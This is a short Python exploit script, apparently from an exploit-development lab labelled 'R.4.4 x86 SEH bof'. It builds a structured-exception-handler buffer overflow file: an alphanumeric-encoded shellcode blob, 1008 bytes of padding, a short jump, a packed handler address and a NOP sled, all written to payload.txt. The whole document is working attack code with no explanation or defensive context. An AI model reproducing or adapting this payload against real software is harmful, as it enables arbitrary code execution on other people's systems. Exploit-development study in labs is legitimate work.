# R.4.4 x86 SEH bof

import struct

buf =  b""
buf += b"\x89\xe6\xdb\xc0\xd9\x76\xf4\x59\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43"
buf += b"\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41"
buf += b"\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42"
buf += b"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x69"
buf += b"\x6c\x4b\x58\x6f\x72\x77\x70\x33\x30\x33\x30\x51"
buf += b"\x70\x4d\x59\x38\x65\x65\x61\x69\x50\x30\x64\x4e"
buf += b"\x6b\x76\x30\x54\x70\x6e\x6b\x32\x72\x54\x4c\x6c"
buf += b"\x4b\x32\x72\x62\x34\x6c\x4b\x33\x42\x37\x58\x34"
buf += b"\x4f\x4d\x67\x50\x4a\x47\x56\x54\x71\x39\x6f\x4c"
buf += b"\x6c\x75\x6c\x30\x61\x51\x6c\x33\x32\x66\x4c\x31"
buf += b"\x30\x7a\x61\x4a\x6f\x44\x4d\x63\x31\x58\x47\x38"
buf += b"\x62\x79\x62\x71\x42\x42\x77\x6c\x4b\x76\x32\x46"
buf += b"\x70\x6c\x4b\x51\x5a\x45\x6c\x4c\x4b\x32\x6c\x74"
buf += b"\x51\x51\x68\x7a\x43\x31\x58\x36\x61\x68\x51\x36"
buf += b"\x31\x4e\x6b\x36\x39\x77\x50\x67\x71\x7a\x73\x4c"
buf += b"\x4b\x62\x69\x66\x78\x38\x63\x67\x4a\x73\x79\x6e"
buf += b"\x6b\x30\x34\x4c\x4b\x76\x61\x48\x56\x45\x61\x6b"
buf += b"\x4f\x4e\x4c\x39\x51\x78\x4f\x34\x4d\x76\x61\x4f"
buf += b"\x37\x34\x78\x39\x70\x54\x35\x68\x76\x63\x33\x31"
buf += b"\x6d\x4a\x58\x55\x6b\x61\x6d\x57\x54\x61\x65\x69"
buf += b"\x74\x30\x58\x4e\x6b\x53\x68\x75\x74\x45\x51\x49"
buf += b"\x43\x73\x56\x4e\x6b\x54\x4c\x32\x6b\x6e\x6b\x42"
buf += b"\x78\x47\x6c\x76\x61\x48\x53\x4e\x6b\x46\x64\x6e"
buf += b"\x6b\x73\x31\x58\x50\x6e\x69\x70\x44\x64\x64\x47"
buf += b"\x54\x71\x4b\x63\x6b\x33\x51\x63\x69\x63\x6a\x72"
buf += b"\x71\x59\x6f\x79\x70\x63\x6f\x43\x6f\x43\x6a\x4c"
buf += b"\x4b\x46\x72\x38\x6b\x4c\x4d\x53\x6d\x62\x4a\x36"
buf += b"\x61\x4e\x6d\x4d\x55\x68\x32\x43\x30\x55\x50\x53"
buf += b"\x30\x62\x70\x43\x58\x76\x51\x4e\x6b\x30\x6f\x6e"
buf += b"\x67\x4b\x4f\x4e\x35\x4f\x4b\x6a\x50\x4f\x45\x69"
buf += b"\x32\x46\x36\x50\x68\x4c\x66\x6e\x75\x4f\x4d\x6f"
buf += b"\x6d\x79\x6f\x38\x55\x67\x4c\x36\x66\x33\x4c\x56"
buf += b"\x6a\x6b\x30\x59\x6b\x69\x70\x44\x35\x46\x65\x6d"
buf += b"\x6b\x32\x67\x34\x53\x32\x52\x50\x6f\x72\x4a\x43"
buf += b"\x30\x61\x43\x49\x6f\x5a\x75\x31\x73\x65\x31\x32"
buf += b"\x4c\x71\x73\x64\x6e\x43\x55\x62\x58\x63\x55\x65"
buf += b"\x50\x41\x41"

f = open('payload.txt', 'wb')
f.write(b'A'*(1008)+b"\xeb\x1f\x90\x90"+struct.pack("<I",0x64c45cb7)+b'\x90'*50+buf)
f.close()

